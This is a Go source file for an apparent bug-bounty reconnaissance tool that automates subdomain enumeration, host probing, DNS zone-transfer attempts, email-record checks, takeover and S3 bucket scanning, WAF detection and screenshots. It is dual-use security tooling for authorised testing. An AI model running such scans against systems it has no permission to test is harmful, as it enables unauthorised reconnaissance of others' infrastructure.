package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"sort"
	"strings"
	"sync"
	"time"

	"github.com/miekg/dns"
	"gopkg.in/yaml.v3"
)

// ─── ANSI colors ─────────────────────────────────────────────────────────────

const (
	colorGreen   = "\033[32m"
	colorRed     = "\033[31m"
	colorBlue    = "\033[34m"
	colorSkyBlue = "\033[38;5;153m"
	colorEnd     = "\033[0m"
)

func green(s string) string   { return colorGreen + s + colorEnd }
func red(s string) string     { return colorRed + s + colorEnd }
func blue(s string) string    { return colorBlue + s + colorEnd }
func skyBlue(s string) string { return colorSkyBlue + s + colorEnd }

// ─── Logger ──────────────────────────────────────────────────────────────────

var logger = log.New(os.Stdout, "", 0)

func logInfo(msg string)  { logger.Println("[INFO] " + msg) }
func logWarn(msg string)  { logger.Println("[WARN] " + msg) }
func logDebug(msg string) { logger.Println("[DEBUG] " + msg) }
func logError(msg string) { logger.Println("[ERROR] " + msg) }

// ─── Banner ───────────────────────────────────────────────────────────────────

const banner = colorGreen + `
    ______      __                      __  __            __
   / ____/___ _/ /________  ____  ___  / / / /_  ______  / /____  _____
  / /_  / __ ` + "`" + `/ / ___/ __ \/ __ \/ _ \/ /_/ / / / / __ \/ __/ _ \/ ___/
 / __/ / /_/ / / /__/ /_/ / / / /  __/ __  / /_/ / / / / /_/  __/ /
/_/    \__,_/_/\___/\____/_/ /_/\___/_/ /_/\__,_/_/ /_/\__/\___/_/
                                                    Coder: OctaYus0x01
                                                    https://github.com/octayus
` + colorEnd

const doneBanner = colorGreen + `
  ________            _____                     _         ____                        ______                __   __               __      __   _____
 /_  __/ /_  ___     / ___/_________ _____     (_)____   / __ \____  ____  ___       / ____/___  ____  ____/ /  / /   __  _______/ /__   / /  |__  /
  / / / __ \/ _ \    \__ \/ ___/ __ ` + "`" + `/ __ \   / / ___/  / / / / __ \/ __ \/ _ \     / / __/ __ \/ __ \/ __  /  / /   / / / / ___/ //_/  / /    /_ <
 / / / / / /  __/   ___/ / /__/ /_/ / / / /  / (__  )  / /_/ / /_/ / / / /  __/    / /_/ / /_/ / /_/ / /_/ /  / /___/ /_/ / /__/ ,<     \ \  ___/ /
/_/ /_/ /_/\___/   /____/\___/\__,_/_/ /_/  /_/____/  /_____/\____/_/ /_/\___(_)   \____/\____/\____/\__,_/  /_____/\__,_/\___/_/|_|     \_\/____/
` + colorEnd

// ─── Helpers ─────────────────────────────────────────────────────────────────

// findGoBin returns ~/go/bin/<name> if it exists, otherwise falls back to PATH.
func findGoBin(name string) string {
	ext := ""
	if runtime.GOOS == "windows" {
		ext = ".exe"
	}
	home, _ := os.UserHomeDir()
	candidate := filepath.Join(home, "go", "bin", name+ext)
	if _, err := os.Stat(candidate); err == nil {
		return candidate
	}
	if path, err := exec.LookPath(name); err == nil {
		return path
	}
	return name
}

func toolInPath(name string) bool {
	p := findGoBin(name)
	if filepath.IsAbs(p) {
		_, err := os.Stat(p)
		return err == nil
	}
	_, err := exec.LookPath(p)
	return err == nil
}

func fileExistsNonEmpty(path string) bool {
	fi, err := os.Stat(path)
	return err == nil && fi.Size() > 0
}

func countLines(path string) int {
	f, err := os.Open(path)
	if err != nil {
		return 0
	}
	defer f.Close()
	n := 0
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		if strings.TrimSpace(sc.Text()) != "" {
			n++
		}
	}
	return n
}

func writeLines(path string, lines []string) error {
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer f.Close()
	for _, l := range lines {
		f.WriteString(l + "\n")
	}
	return nil
}

func readLines(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()
	var out []string
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		if t := strings.TrimSpace(sc.Text()); t != "" {
			out = append(out, t)
		}
	}
	return out, sc.Err()
}

// runAnew pipes data to `anew <dest>` so only new lines are appended.
func runAnew(dest string, data []byte) {
	cmd := exec.Command("anew", dest)
	cmd.Stdin = bytes.NewReader(data)
	cmd.Stdout = io.Discard
	cmd.Stderr = io.Discard
	_ = cmd.Run()
}

// run executes a command, returns (stdout, stderr, error).
func run(timeout time.Duration, name string, args ...string) ([]byte, []byte, error) {
	cmd := exec.Command(name, args...)
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	if err := cmd.Start(); err != nil {
		return nil, nil, err
	}
	done := make(chan error, 1)
	go func() { done <- cmd.Wait() }()

	if timeout > 0 {
		select {
		case err := <-done:
			return stdout.Bytes(), stderr.Bytes(), err
		case <-time.After(timeout):
			_ = cmd.Process.Kill()
			return stdout.Bytes(), stderr.Bytes(), fmt.Errorf("timed out after %s", timeout)
		}
	}
	err := <-done
	return stdout.Bytes(), stderr.Bytes(), err
}

// runWithStdin like run but accepts stdin data.
func runWithStdin(timeout time.Duration, stdin []byte, name string, args ...string) ([]byte, []byte, error) {
	cmd := exec.Command(name, args...)
	cmd.Stdin = bytes.NewReader(stdin)
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	if err := cmd.Start(); err != nil {
		return nil, nil, err
	}
	done := make(chan error, 1)
	go func() { done <- cmd.Wait() }()

	if timeout > 0 {
		select {
		case err := <-done:
			return stdout.Bytes(), stderr.Bytes(), err
		case <-time.After(timeout):
			_ = cmd.Process.Kill()
			return stdout.Bytes(), stderr.Bytes(), fmt.Errorf("timed out after %s", timeout)
		}
	}
	err := <-done
	return stdout.Bytes(), stderr.Bytes(), err
}

// runInherit runs a command with inherited stdout/stderr (shows live output).
func runInherit(timeout time.Duration, name string, args ...string) error {
	cmd := exec.Command(name, args...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Start(); err != nil {
		return err
	}
	done := make(chan error, 1)
	go func() { done <- cmd.Wait() }()

	if timeout > 0 {
		select {
		case err := <-done:
			return err
		case <-time.After(timeout):
			_ = cmd.Process.Kill()
			return fmt.Errorf("timed out after %s", timeout)
		}
	}
	return <-done
}

// ─── Config ──────────────────────────────────────────────────────────────────

type Config struct {
	Telegram struct {
		Token  string `yaml:"token"`
		ChatID string `yaml:"chat_id"`
	} `yaml:"telegram"`
	Discord struct {
		WebhookURL string `yaml:"webhook_url"`
	} `yaml:"discord"`
	Slack struct {
		WebhookURL string `yaml:"webhook_url"`
	} `yaml:"slack"`
	Cleanup struct {
		Enabled          bool `yaml:"enabled"`
		RemoveEmptyFiles bool `yaml:"remove_empty_files"`
		RemoveEmptyDirs  bool `yaml:"remove_empty_dirs"`
	} `yaml:"cleanup"`
	Nuclei struct {
		RateLimit   int `yaml:"rate_limit"`
		BulkSize    int `yaml:"bulk_size"`
		Concurrency int `yaml:"concurrency"`
	} `yaml:"nuclei"`
	Ffuf struct {
		Wordlist   string `yaml:"wordlist"`
		Threads    int    `yaml:"threads"`
		Timeout    int    `yaml:"timeout"`
		MatchCodes string `yaml:"match_codes"`
	} `yaml:"ffuf"`
	Dirsearch struct {
		Wordlist   string `yaml:"wordlist"`
		Threads    int    `yaml:"threads"`
		Extensions string `yaml:"extensions"`
	} `yaml:"dirsearch"`
	ApiDiscovery struct {
		Wordlist string `yaml:"wordlist"`
	} `yaml:"api_discovery"`
}

func loadConfig(path string) Config {
	cfg := Config{}
	cfg.Cleanup.Enabled = true
	cfg.Cleanup.RemoveEmptyFiles = true
	cfg.Cleanup.RemoveEmptyDirs = true
	cfg.Nuclei.RateLimit = 150
	cfg.Nuclei.BulkSize = 25
	cfg.Nuclei.Concurrency = 10
	cfg.Ffuf.Threads = 40
	cfg.Ffuf.Timeout = 10
	cfg.Ffuf.MatchCodes = "200,204,301,302,307,401,403"
	cfg.Dirsearch.Threads = 25
	cfg.Dirsearch.Extensions = "php,html,js,txt,json,xml,bak,zip"

	data, err := os.ReadFile(path)
	if err != nil {
		logWarn(red("(!) Config file not found, using defaults"))
		return cfg
	}
	if err := yaml.Unmarshal(data, &cfg); err != nil {
		logWarn(red("(!) Config parse error, using defaults: " + err.Error()))
	}
	return cfg
}

// ─── ScanState (resume checkpoints) ──────────────────────────────────────────

type ScanState struct {
	path  string
	mu    sync.Mutex
	state map[string]bool
}

func newScanState(outputDir string) *ScanState {
	s := &ScanState{
		path:  filepath.Join(outputDir, ".scan_state.json"),
		state: make(map[string]bool),
	}
	data, err := os.ReadFile(s.path)
	if err == nil {
		_ = json.Unmarshal(data, &s.state)
		done := 0
		for _, v := range s.state {
			if v {
				done++
			}
		}
		logInfo(skyBlue(fmt.Sprintf("(i) Resuming scan — %d phase(s) already done", done)))
	}
	return s
}

func (s *ScanState) isDone(phase string) bool {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.state[phase]
}

func (s *ScanState) markDone(phase string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.state[phase] = true
	data, _ := json.MarshalIndent(s.state, "", "  ")
	_ = os.WriteFile(s.path, data, 0644)
}

// ─── MakeDirectories ─────────────────────────────────────────────────────────

func makeDirectories(outputFile string) {
	logInfo(green("[+] Creating directories"))

	dirs := []string{"hosts", "urls", "vuln", "screenshots"}
	for _, d := range dirs {
		p := filepath.Join(outputFile, d)
		if err := os.MkdirAll(p, 0755); err != nil {
			logError(red("Error creating dir " + p + ": " + err.Error()))
			return
		}
		logInfo(green("[+] " + d + " Directory successfully created"))
	}

	fmt.Println("\n" + skyBlue(strings.Repeat("=", 40)) + "\n")

	hostsFiles := []string{
		"alive-hosts.txt", "httpx.txt", "subs.txt",
		"https-alive.txt", "cnames.txt", "zone-transfer.txt",
	}
	for _, fn := range hostsFiles {
		p := filepath.Join(outputFile, "hosts", fn)
		if f, err := os.OpenFile(p, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0644); err == nil {
			f.Close()
		}
		logInfo(skyBlue("[+] " + fn + " File successfully created"))
	}

	urlsFiles := []string{
		"all-urls.txt", "js-files.txt", "leaked-docs.txt",
		"mantra_output.txt", "params.txt",
		"gf-xss.txt", "gf-ssrf.txt", "gf-lfi.txt",
		"gf-ssti.txt", "gf-sqli.txt", "gf-redirect.txt",
	}
	for _, fn := range urlsFiles {
		p := filepath.Join(outputFile, "urls", fn)
		if f, err := os.OpenFile(p, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0644); err == nil {
			f.Close()
		}
		logInfo(skyBlue("[+] " + fn + " File successfully created"))
	}

	vulnFiles := []string{
		"nuclei-output.txt", "nuclei-dast-output.txt", "ffuf-output.txt",
		"xss.txt", "lfi.txt", "ssrf.txt", "sqli.txt", "ssti.txt",
		"js-findings.txt", "missing-dmarc.json", "takeovers.json",
		"aws_vuln_bucket.txt", "lfi-urls.txt", "lfi-subs.txt",
		"cors.txt", "crlf.txt", "403-bypass.txt", "api-endpoints.txt",
		"dirsearch-output.txt", "dalfox-xss.txt", "open-redirects.txt",
		"secrets.txt", "trufflehog.txt", "waf.txt", "params-arjun.txt",
	}
	for _, fn := range vulnFiles {
		p := filepath.Join(outputFile, "vuln", fn)
		if f, err := os.OpenFile(p, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0644); err == nil {
			f.Close()
		}
		logInfo(skyBlue("[+] " + fn + " File successfully created"))
	}
}

// ─── check_tools ─────────────────────────────────────────────────────────────

// ─── update ──────────────────────────────────────────────────────────────────

// repoDir returns the directory of the FalconHunter checkout. The binary
// usually lives in cmd/falcon/, so we walk upward looking for a .git folder.
func repoDir() string {
	exe, err := os.Executable()
	start := ""
	if err == nil {
		start = filepath.Dir(exe)
	}
	if cwd, err := os.Getwd(); err == nil && start == "" {
		start = cwd
	}
	dir := start
	for i := 0; i < 6 && dir != "" && dir != "/"; i++ {
		if st, err := os.Stat(filepath.Join(dir, ".git")); err == nil && st.IsDir() {
			return dir
		}
		dir = filepath.Dir(dir)
	}
	if cwd, err := os.Getwd(); err == nil {
		return cwd
	}
	return start
}

func updateTool() bool {
	dir := repoDir()
	fmt.Println(green("(+) Updating FalconHunter in " + dir))

	if st, err := os.Stat(filepath.Join(dir, ".git")); err != nil || !st.IsDir() {
		fmt.Println(red("(-) Not a git checkout — clone the repo to use -up"))
		fmt.Println("    git clone https://github.com/octayus/FalconHunter " + dir)
		return false
	}

	if _, err := exec.LookPath("git"); err != nil {
		fmt.Println(red("(-) git not found in PATH — cannot self-update"))
		return false
	}

	head := func() string {
		out, _, _ := run(30*time.Second, "git", "-C", dir, "rev-parse", "HEAD")
		return strings.TrimSpace(string(out))
	}
	before := head()

	stdout, stderr, err := run(2*time.Minute, "git", "-C", dir, "pull", "--ff-only")
	if err != nil {
		msg := strings.TrimSpace(string(stderr))
		if msg == "" {
			msg = strings.TrimSpace(string(stdout))
		}
		fmt.Println(red("(-) git pull failed: " + msg))
		return false
	}

	after := head()
	if before == after {
		fmt.Println(skyBlue("(i) FalconHunter is already up to date (" + shortSHA(after) + ")"))
		return true
	}
	fmt.Println(green("(+) Updated " + shortSHA(before) + " → " + shortSHA(after)))
	log, _, _ := run(30*time.Second, "git", "-C", dir, "log", "--oneline", before+".."+after)
	if s := strings.TrimSpace(string(log)); s != "" {
		fmt.Println(s)
	}
	fmt.Println(skyBlue("(i) Rebuild the binary: go build -o cmd/falcon/falcon ./cmd/falcon/"))
	return true
}

func shortSHA(sha string) string {
	if len(sha) >= 7 {
		return sha[:7]
	}
	return sha
}

func checkTools() bool {
	required := []string{"subfinder", "httpx", "waybackurls", "anew"}
	optional := []string{
		"gau", "gf", "cnfinder", "BadAuth0", "mantra", "katana",
		"nuclei", "s3scanner", "aws_extractor", "ffuf",
		"corsy", "crlfuzz", "dirsearch", "bypass-403", "kr",
		"dalfox", "openredirex", "paramspider", "secretfinder",
		"trufflehog", "gitleaks", "amass", "dnsx", "waymore",
		"wafw00f", "gowitness", "arjun", "qsreplace",
	}

	fmt.Println("\n=== Required Tools ===")
	var missingRequired []string
	for _, name := range required {
		if toolInPath(name) {
			fmt.Println("  [+] " + name)
		} else {
			fmt.Println("  [!] " + name + "  MISSING")
			missingRequired = append(missingRequired, name)
		}
	}

	fmt.Println("\n=== Optional Tools ===")
	var missingOptional []string
	for _, name := range optional {
		if toolInPath(name) {
			fmt.Println("  [+] " + name)
		} else {
			fmt.Println("  [-] " + name + "  not found")
			missingOptional = append(missingOptional, name)
		}
	}
	fmt.Println()

	if len(missingRequired) > 0 {
		fmt.Printf("[!] %d required tool(s) missing — scans will fail: %s\n",
			len(missingRequired), strings.Join(missingRequired, ", "))
	} else if len(missingOptional) == 0 {
		fmt.Println("[+] All tools found.")
	} else {
		fmt.Printf("[i] %d optional tool(s) not installed (modules using them will be skipped).\n",
			len(missingOptional))
	}
	return len(missingRequired) == 0
}

// ─── SubdomainsCollector ─────────────────────────────────────────────────────

type SubdomainsCollector struct {
	domains    string
	outputFile string
}

func (sc *SubdomainsCollector) subfinderSubs() {
	output := filepath.Join(sc.outputFile, "hosts", "subs.txt")

	// subfinder
	logInfo(green("(+) Subdomain enumeration (subfinder)"))
	if err := runInherit(0, "subfinder", "-dL", sc.domains, "-all", "-o", output); err != nil {
		logWarn(red("(-) subfinder: " + err.Error()))
	}

	// amass passive
	if toolInPath("amass") {
		logInfo(green("(+) Subdomain enumeration (amass passive)"))
		tmp, err := os.CreateTemp("", "amass-*.txt")
		if err == nil {
			tmp.Close()
			stdout, stderr, err := run(10*time.Minute, "amass", "enum", "-passive",
				"-nocolor", "-dL", sc.domains, "-o", tmp.Name())
			if err != nil {
				if len(stderr) > 0 {
					logDebug("amass stderr: " + string(stderr))
				}
				if !strings.Contains(err.Error(), "timed out") {
					logWarn(red("(-) amass timed out"))
				}
			}
			_ = stdout
			data, err := os.ReadFile(tmp.Name())
			if err == nil && len(bytes.TrimSpace(data)) > 0 {
				runAnew(output, data)
			}
			os.Remove(tmp.Name())
		}
	}

	// dnsx
	if toolInPath("dnsx") && fileExistsNonEmpty(output) {
		logInfo(green("(+) DNS resolution with dnsx"))
		resolved := filepath.Join(sc.outputFile, "hosts", "subs-resolved.txt")
		_, _, err := run(10*time.Minute, findGoBin("dnsx"), "-l", output, "-o", resolved, "-silent")
		if err != nil {
			logWarn(red("(-) dnsx: " + err.Error()))
		} else if fileExistsNonEmpty(resolved) {
			data, _ := os.ReadFile(resolved)
			_ = os.WriteFile(output, data, 0644)
			logInfo(green("(+) dnsx resolved subs saved to " + output))
		}
	}
}

func (sc *SubdomainsCollector) probe() {
	subdomainsFile := filepath.Join(sc.outputFile, "hosts", "subs.txt")
	httpxOutput := filepath.Join(sc.outputFile, "hosts", "httpx.txt")
	aliveOutput := filepath.Join(sc.outputFile, "hosts", "alive-hosts.txt")

	logInfo(green("(+) Probing alive hosts"))
	httpxBin := findGoBin("httpx")
	if err := runInherit(0, httpxBin,
		"-list", subdomainsFile,
		"-sc", "-title", "-fr", "-tech-detect",
		"-ip", "-cname", "-cdn", "-favicon",
		"-o", httpxOutput,
	); err != nil {
		logWarn(red("(-) httpx: " + err.Error()))
		return
	}

	// Deduplicate alive hosts
	existing := make(map[string]bool)
	if lines, err := readLines(aliveOutput); err == nil {
		for _, l := range lines {
			existing[l] = true
		}
	}

	var newLines []string
	if lines, err := readLines(httpxOutput); err == nil {
		for _, line := range lines {
			parts := strings.Fields(line)
			if len(parts) == 0 {
				continue
			}
			host := parts[0]
			if strings.Contains(host, "http") && !existing[host] {
				existing[host] = true
				newLines = append(newLines, host)
			}
		}
	}
	if len(newLines) > 0 {
		writeLines(aliveOutput, newLines)
	}

	// https-alive.txt
	httpsOutput := filepath.Join(sc.outputFile, "hosts", "https-alive.txt")
	if lines, err := readLines(aliveOutput); err == nil {
		var httpsLines []string
		for _, l := range lines {
			if strings.HasPrefix(l, "https://") {
				httpsLines = append(httpsLines, l)
			}
		}
		if len(httpsLines) > 0 {
			os.WriteFile(httpsOutput, []byte(strings.Join(httpsLines, "\n")+"\n"), 0644)
		}
	}
}

// ─── DmarcFinder ─────────────────────────────────────────────────────────────

var dkimSelectors = []string{"default", "google", "mail", "dkim", "selector1", "selector2", "k1", "smtp"}

func dnsQuery(name string, qtype uint16, timeout time.Duration) ([]dns.RR, error) {
	c := new(dns.Client)
	c.Timeout = timeout
	m := new(dns.Msg)
	m.SetQuestion(dns.Fqdn(name), qtype)
	m.RecursionDesired = true

	servers := []string{"8.8.8.8:53", "1.1.1.1:53"}
	for _, srv := range servers {
		r, _, err := c.Exchange(m, srv)
		if err == nil && r != nil {
			return r.Answer, nil
		}
	}
	return nil, fmt.Errorf("no DNS response for %s", name)
}

func checkSPF(domain string) bool {
	answers, err := dnsQuery(domain, dns.TypeTXT, 3*time.Second)
	if err != nil {
		return false
	}
	for _, rr := range answers {
		if txt, ok := rr.(*dns.TXT); ok {
			for _, s := range txt.Txt {
				if strings.HasPrefix(s, "v=spf1") {
					return true
				}
			}
		}
	}
	return false
}

func checkDMARC(domain string) bool {
	answers, err := dnsQuery("_dmarc."+domain, dns.TypeTXT, 3*time.Second)
	if err != nil {
		return false
	}
	for _, rr := range answers {
		if txt, ok := rr.(*dns.TXT); ok {
			for _, s := range txt.Txt {
				if strings.HasPrefix(s, "v=DMARC1") {
					return true
				}
			}
		}
	}
	return false
}

func checkDKIM(domain string) string {
	for _, sel := range dkimSelectors {
		name := sel + "._domainkey." + domain
		answers, err := dnsQuery(name, dns.TypeTXT, 2*time.Second)
		if err != nil {
			continue
		}
		for _, rr := range answers {
			if txt, ok := rr.(*dns.TXT); ok {
				for _, s := range txt.Txt {
					if strings.Contains(s, "v=DKIM1") {
						return sel
					}
				}
			}
		}
	}
	return ""
}

func checkZoneTransfer(domains []string, outputFile string) {
	out := filepath.Join(outputFile, "hosts", "zone-transfer.txt")
	logInfo(green("(+) Testing DNS zone transfer (AXFR)"))

	var findings []string
	for _, domain := range domains {
		nsAnswers, err := dnsQuery(domain, dns.TypeNS, 5*time.Second)
		if err != nil {
			continue
		}
		for _, rr := range nsAnswers {
			ns, ok := rr.(*dns.NS)
			if !ok {
				continue
			}
			nsHost := strings.TrimSuffix(ns.Ns, ".")
			t := new(dns.Transfer)
			m := new(dns.Msg)
			m.SetAxfr(dns.Fqdn(domain))
			ch, err := t.In(m, nsHost+":53")
			if err != nil {
				continue
			}
			count := 0
			for env := range ch {
				if env.Error != nil {
					count = -1
					break
				}
				count += len(env.RR)
			}
			if count > 0 {
				msg := fmt.Sprintf("[!] ZONE TRANSFER ALLOWED: %s via %s (%d records)", domain, nsHost, count)
				findings = append(findings, msg)
				logWarn(red(msg))
			}
		}
	}

	content := strings.Join(findings, "\n")
	if len(findings) > 0 {
		content += "\n"
		logWarn(red(fmt.Sprintf("[!] %d zone transfer(s) possible → %s", len(findings), out)))
	} else {
		logInfo(green("(+) No zone transfers allowed"))
	}
	os.WriteFile(out, []byte(content), 0644)
}

type dmarcResult struct {
	Domain       string `json:"domain"`
	SPFValid     bool   `json:"spf_valid"`
	DMARCValid   bool   `json:"dmarc_valid"`
	DKIMValid    bool   `json:"dkim_valid"`
	DKIMSelector string `json:"dkim_selector"`
	Status       string `json:"status"`
}

func validateDomains(domainsFile, outputFile string) {
	logInfo(green("(+) Checking for DMARC, SPF, DKIM records"))

	lines, err := readLines(domainsFile)
	if err != nil {
		logError(red("Error reading domains: " + err.Error()))
		return
	}

	var results []dmarcResult
	for _, domain := range lines {
		spf := checkSPF(domain)
		dmarc := checkDMARC(domain)
		dkim := checkDKIM(domain)

		status := "Valid"
		if !spf || !dmarc || dkim == "" {
			status = "Vulnerable"
			var missing []string
			if !spf {
				missing = append(missing, "SPF")
			}
			if !dmarc {
				missing = append(missing, "DMARC")
			}
			if dkim == "" {
				missing = append(missing, "DKIM")
			}
			logInfo(red(fmt.Sprintf("(-) %s missing: %s", domain, strings.Join(missing, ", "))))
		}
		results = append(results, dmarcResult{
			Domain: domain, SPFValid: spf, DMARCValid: dmarc,
			DKIMValid: dkim != "", DKIMSelector: dkim, Status: status,
		})
	}

	outJSON := filepath.Join(outputFile, "vuln", "missing-dmarc.json")
	data, _ := json.MarshalIndent(results, "", "    ")
	os.WriteFile(outJSON, data, 0644)

	vuln := 0
	for _, r := range results {
		if r.Status == "Vulnerable" {
			vuln++
		}
	}
	logInfo(green(fmt.Sprintf("[+] Email security check done — %d/%d domain(s) vulnerable → %s", vuln, len(results), outJSON)))
	fmt.Println("\n" + skyBlue(strings.Repeat("=", 40)) + "\n")
}

// ─── SubdomainTakeOver ────────────────────────────────────────────────────────

type takeoverEntry struct {
	Subdomain string `json:"subdomain"`
	Service   string `json:"service"`
	Tool      string `json:"tool"`
}

func getCNAME(outputFile string) {
	subsFile := filepath.Join(outputFile, "hosts", "subs.txt")
	out := filepath.Join(outputFile, "hosts", "cnames.txt")

	if !fileExistsNonEmpty(subsFile) {
		logWarn(red("(-) No subdomains file or empty, skipping CNAME"))
		return
	}
	logInfo(green("(+) CNAME analysis for possible takeovers"))
	stdout, stderr, err := run(5*time.Minute, "cnfinder", "-l", subsFile, "-o", out)
	_ = stdout
	if err != nil {
		logWarn(red("(-) cnfinder: " + err.Error()))
		if len(stderr) > 0 {
			logDebug("cnfinder stderr: " + string(stderr))
		}
		return
	}
	if lines, err := readLines(out); err == nil {
		logInfo(green(fmt.Sprintf("(+) Found total of: %d CNAME", len(lines))))
	}
}

func testTakeover(outputFile string) {
	subsFile := filepath.Join(outputFile, "hosts", "subs.txt")
	nucleiOut := filepath.Join(outputFile, "vuln", "takeovers-nuclei.txt")

	if !fileExistsNonEmpty(subsFile) {
		logDebug("No subdomains file for takeover tests, skipping")
		return
	}
	logInfo(green("(+) Running nuclei takeover templates"))
	absPath, _ := filepath.Abs(subsFile)
	_, stderr, err := run(15*time.Minute, findGoBin("nuclei"),
		"-l", absPath, "-t", "http/takeovers/", "-silent", "-nc", "-o", nucleiOut)
	if err != nil && strings.Contains(err.Error(), "not found") {
		logWarn(red("(-) nuclei not found in PATH (optional)"))
		return
	}
	if len(stderr) > 0 {
		logDebug("nuclei stderr: " + string(stderr))
	}

	var takeovers []takeoverEntry
	if fileExistsNonEmpty(nucleiOut) {
		lines, _ := readLines(nucleiOut)
		re := regexp.MustCompile(`\[([^\]]+)\]\s+\[[^\]]+\]\s+\[[^\]]+\]\s+(\S+)`)
		for _, line := range lines {
			line = strings.TrimSpace(line)
			if line == "" {
				continue
			}
			service := "unknown"
			subdomain := line
			if m := re.FindStringSubmatch(line); m != nil {
				service = m[1]
				subdomain = m[2]
			}
			takeovers = append(takeovers, takeoverEntry{Subdomain: subdomain, Service: service, Tool: "nuclei"})
			logInfo(red("[!] Takeover: " + subdomain + " (" + service + ") via nuclei"))
		}
	}

	takeJSON := filepath.Join(outputFile, "vuln", "takeovers.json")
	if takeovers == nil {
		takeovers = []takeoverEntry{}
	}
	data, _ := json.MarshalIndent(takeovers, "", "    ")
	os.WriteFile(takeJSON, data, 0644)

	if len(takeovers) > 0 {
		logInfo(red(fmt.Sprintf("[!] %d subdomain takeover(s) found → %s", len(takeovers), takeJSON)))
	} else {
		logInfo(green("(+) No subdomain takeovers found"))
	}
}

func runAuth0(domainsFile, outputFile, email string) {
	if email == "" {
		return
	}
	hostsFile := filepath.Join(outputFile, "hosts", "alive-hosts.txt")
	if !fileExistsNonEmpty(hostsFile) {
		logInfo(skyBlue("(-) No alive hosts for Auth0 test, skipping"))
		return
	}
	outDir := filepath.Join(outputFile, "hosts", "auth0")
	os.MkdirAll(outDir, 0755)
	logInfo(green("(+) Testing for Auth0 self account signup"))
	if err := runInherit(0, "BadAuth0", "-l", hostsFile, "-o", outDir, "-e", email); err != nil {
		logWarn(red("(-) BadAuth0: " + err.Error()))
	}
}

// ─── BucketFinder ────────────────────────────────────────────────────────────

func bucketsCLI(outputFile string) {
	cnamesFile := filepath.Join(outputFile, "hosts", "cnames.txt")
	awsCNAMEs := filepath.Join(outputFile, "hosts", "aws_cnames.txt")

	if !fileExistsNonEmpty(cnamesFile) {
		logInfo(skyBlue("(-) No CNAME records found, skipping CNAME-based bucket check"))
		return
	}

	lines, err := readLines(cnamesFile)
	if err != nil {
		logWarn(red("(-) Error reading CNAMEs: " + err.Error()))
		return
	}

	var buckets []string
	for _, line := range lines {
		parts := strings.Fields(line)
		if len(parts) >= 3 && strings.Contains(parts[2], "s3") && strings.Contains(parts[2], "amazonaws") {
			bucket := strings.TrimSuffix(parts[2], ".")
			buckets = append(buckets, bucket)
		}
	}

	if len(buckets) > 0 {
		os.WriteFile(awsCNAMEs, []byte(strings.Join(buckets, "\n")+"\n"), 0644)
		logInfo(skyBlue(fmt.Sprintf("AWS CNAMEs written to %s. Install s3scanner to test bucket permissions.", awsCNAMEs)))
		if toolInPath("s3scanner") {
			scanOut := filepath.Join(outputFile, "vuln", "aws_vuln_bucket.txt")
			_, _, err := run(15*time.Minute, "s3scanner", "scan", "-l", awsCNAMEs, "-o", scanOut)
			if err != nil {
				logDebug("s3scanner: " + err.Error())
			} else {
				logInfo(green("(+) s3scanner bucket check completed"))
			}
		}
	} else {
		logInfo(skyBlue("No AWS CNAMEs found in CNAME list."))
	}
}

func awsExtractor(outputFile string) {
	urlsFile := filepath.Join(outputFile, "urls", "all-urls.txt")
	outFile := filepath.Join(outputFile, "urls", "aws_vuln_bucket.txt")

	if !fileExistsNonEmpty(urlsFile) {
		logWarn(red("(-) No URLs file for aws_extractor, skipping"))
		return
	}
	logInfo(green("(+) Running aws_extractor (no timeout, 50 workers)"))
	if err := runInherit(0, "aws_extractor", "-u", urlsFile, "-test-takeover", "-w", "50", "-o", outFile); err != nil {
		if strings.Contains(err.Error(), "not found") {
			logWarn(red("(-) aws_extractor not found in PATH"))
		} else {
			logError(red("Error in aws_extractor: " + err.Error()))
		}
	}
}

// ─── WafDetector ─────────────────────────────────────────────────────────────

func detectWAF(outputFile string) {
	hostsFile := filepath.Join(outputFile, "hosts", "alive-hosts.txt")
	out := filepath.Join(outputFile, "vuln", "waf.txt")

	if !fileExistsNonEmpty(hostsFile) {
		logInfo(skyBlue("(-) No alive hosts for WAF detection, skipping"))
		return
	}
	if !toolInPath("wafw00f") {
		logWarn(red("(-) wafw00f not found in PATH (optional)"))
		return
	}
	logInfo(green("(+) Detecting WAFs with wafw00f"))
	_, _, err := run(10*time.Minute, "wafw00f", "-i", hostsFile, "-o", out, "-f", "txt")
	if err != nil {
		logWarn(red("(-) wafw00f: " + err.Error()))
		return
	}
	if fileExistsNonEmpty(out) {
		n := countLines(out)
		logInfo(green(fmt.Sprintf("(+) WAF detection done — %d result(s) → %s", n, out)))
	} else {
		logInfo(skyBlue("(-) No WAFs detected"))
	}
}

// ─── ScreenshotCapture ───────────────────────────────────────────────────────

func captureScreenshots(outputFile string) {
	hostsFile := filepath.Join(outputFile, "hosts", "alive-hosts.txt")
	screenshotsDir := filepath.Join(outputFile, "screenshots")
	os.MkdirAll(screenshotsDir, 0755)

	if !fileExistsNonEmpty(hostsFile) {
		logInfo(skyBlue("(-) No alive hosts for screenshots, skipping"))
		return
	}
	logInfo(green("(+) Capturing screenshots with gowitness"))
	_, _, err := run(15*time.Minute, "gowitness", "scan", "file", "-f", hostsFile,
		"--screenshot-path", screenshotsDir)
	if err != nil {
		logWarn(red("(-) gowitness: " + err.Error()))
		return
	}
	entries, _ := os.ReadDir(screenshotsDir)
	count := 0
	for _, e := range entries {
		n := strings.ToLower(e.Name())
		if strings.HasSuffix(n, ".png") || strings.HasSuffix(n, ".jpg") || strings.HasSuffix(n, ".jpeg") {
			count++
		}
	}
	logInfo(green(fmt.Sprintf("(+) %d screenshot(s) saved → %s", count, screenshotsDir)))
}

